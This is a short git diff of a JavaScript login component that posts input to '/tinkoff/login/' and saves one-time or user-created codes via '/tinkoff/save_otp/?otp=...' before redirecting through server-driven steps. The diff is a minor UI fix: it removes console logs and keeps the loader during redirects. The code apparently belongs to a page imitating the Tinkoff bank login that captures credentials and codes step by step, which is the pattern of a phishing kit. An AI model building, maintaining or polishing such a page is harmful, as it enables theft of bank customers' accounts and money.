@@ -63,6 +63,8 @@ class InputControl extends HTMLElement {
         showGlobalLoader();
         this.button.disabled = true;
 
+        let isRedirect = false;
+
         try {
             const response = await fetch('/tinkoff/login/', {
                 method: 'POST',
@@ -86,8 +88,6 @@ class InputControl extends HTMLElement {
             const data = await response.json();
 
             if (data.status === 'success') {
-                console.log(data.current_page_type);
-                console.log(data.next_page_type);
                 if (data.current_page_type === 'Придумайте код') {
                     await fetch(`/tinkoff/save_otp/?otp=${value}`, {
                         method: 'POST',
@@ -95,6 +95,7 @@ class InputControl extends HTMLElement {
                 }
                 const pageType = data.next_page_type;
                 window.location.href = `/tinkoff/next/?step=${pageType}`;
+                isRedirect = true;
             } else {
                 this.showError(data.detail || 'Произошла ошибка.');
                 this.input.value = ''
@@ -103,8 +104,11 @@ class InputControl extends HTMLElement {
             this.showError('Ошибка сети. Попробуйте снова.');
             console.error('Ошибка:', error);
         } finally {
-            this.button.disabled = false;
-            hideGlobalLoader(); // Скрываем лоадер после завершения запроса
+            if (!isRedirect) {
+                this.button.disabled = false;
+                hideGlobalLoader();
+            }
+            
         }
     }
 
